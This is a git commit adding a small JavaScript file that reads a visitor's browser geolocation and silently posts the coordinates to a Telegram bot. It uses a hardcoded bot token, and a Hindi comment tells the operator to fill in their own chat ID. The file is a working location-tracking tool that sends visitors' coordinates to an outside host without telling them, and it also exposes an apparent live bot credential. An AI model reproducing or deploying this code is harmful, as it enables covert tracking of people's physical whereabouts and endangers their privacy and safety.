6869986aeabe2f46e3276e54ca97e72b45508ce9
aradhyashiv <aradhyabhardwaj57@gmail.com>
2025-04-16 01:01:10 +0530

    Add files via upload

---
+++ script.js
@@ -0,0 +1,27 @@
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendToTelegram);
+  } else {
+    alert("Geolocation is not supported by this browser.");
+  }
+}
+
+function sendToTelegram(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const message = `User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
+  const token = "7847229114:AAHGiStrH3Q8CjCMLso-YG_9nqb0jW_-Kkg";
+  const chatId = 123456789; // Yahan apna Telegram numeric ID daalo
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+    }),
+  });
+}
